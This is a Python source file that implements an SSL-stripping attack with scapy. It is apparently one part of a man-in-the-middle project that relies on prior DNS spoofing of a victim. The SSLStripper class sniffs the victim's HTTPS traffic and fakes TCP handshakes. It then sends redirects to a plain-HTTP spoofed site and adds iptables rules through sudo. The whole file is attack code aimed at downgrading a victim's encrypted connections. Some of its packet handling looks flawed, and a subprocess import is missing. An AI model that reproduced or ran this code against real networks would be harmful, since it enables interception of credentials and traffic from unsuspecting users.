from scapy.all import *
from scapy.layers.inet import IP
from logger import log_info, log_warning
from scapy.layers.http import HTTPRequest, TCP, Raw
import atexit

class SSLStripper:
    def __init__(self, interface, ip_victim, ip_attacker, site_to_spoof):
        self.interface = interface
        self.ip_victim = ip_victim
        self.ip_attacker = ip_attacker
        self.site_to_spoof = site_to_spoof

    def strip(self):
        log_info("Starting SSL stripping")
        # Add an iptables rule to drop incoming packets for port 443
        add_iptables_rule(443)
        sniff(
            filter="tcp and port 443",
            prn=self._on_https_request,
            iface=self.interface,
            count=0,
        )
        log_warning("Stopping SSL stripping")

    def _on_https_request(self, packet):
        # Completely ignore packets not coming from victim:
        if packet[IP].src != self.ip_victim:
            return

        # Because we did the DNS spoofing, we should only strip if the destination IP is us (as in only then it is intended for the server)
        if packet[IP].dst != self.ip_attacker:
            log_warning("Ignoring packet from {} because it is not intended for us but for {}".format(packet[IP].src, packet[IP].dst))
            return
        
        # Check if we have a SYN packet such that we can complete the handshake.
        if packet[TCP].flags == 0x02:
            log_info("Received SYN packet from {}".format(packet[IP].src))
            # Construct the SYN-ACK packet
            response = (
                IP(dst=packet[IP].src, src=packet[IP].dst)
                / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="SA", seq=packet[TCP].ack, ack=packet[TCP].seq + 1)
            )

            send(response, verbose=0)
            log_info("Sent SYN-ACK packet to {}".format(packet[IP].src))

        # Ignore ACK packets, as the handshake has completed.
        elif packet[TCP].flags == 0x10:
            log_info("Received ACK packet from {}".format(packet[IP].src))

        # SSL stripping
        else:
            log_info(
                "Received HTTPS request for {} from {}".format(
                    packet[IP].dst, packet[IP].src
                )
            )
            # Construct the HTTP response
            response = (
                IP(dst=packet[IP].src, src=packet[IP].dst)
                / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="R")
                / Raw(load="HTTP/1.1 301 Moved Permanently\nLocation: http://{}".format(self.site_to_spoof))
            )

            send(response, verbose=0)
            log_info("Sent HTTP response for {} to {}".format(packet[IP].src, packet[IP].dst))

def add_iptables_rule(port):
    # Add the iptables rule to drop incoming packets for the specified port
    subprocess.run(["sudo", "iptables", "-A", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "DROP"])

def remove_iptables_rule(port):
    # Remove the iptables rule
    subprocess.run(["sudo", "iptables", "-D", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "DROP"])


atexit.register(remove_iptables_rule, 443)